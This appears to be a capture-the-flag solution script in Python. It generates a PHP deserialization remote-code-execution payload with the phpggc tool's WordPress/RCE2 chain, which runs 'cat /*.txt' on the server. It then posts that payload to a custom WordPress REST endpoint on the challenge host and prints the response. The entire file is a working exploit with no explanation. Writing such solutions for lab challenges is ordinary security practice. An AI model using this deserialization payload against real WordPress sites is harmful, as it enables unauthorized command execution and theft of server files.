import httpx
from subprocess import check_output

URL = "http://ctf.ukmpcc.org:10337/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def handle_data(s, key, code):
        return s.c.post("/wp-json/malc/v1/handle_data", json=dict(key=key, code=code))

class API(BaseAPI):
    ...

def phpgcc_wp_rce2_system(file):
    return check_output(['phpggc', 'WordPress/RCE2', 'system', file]).decode().strip()

if __name__ == "__main__":
    api = API()
    payload = phpgcc_wp_rce2_system("cat /*.txt")
    res = api.handle_data("b", payload)
    print(res.text)
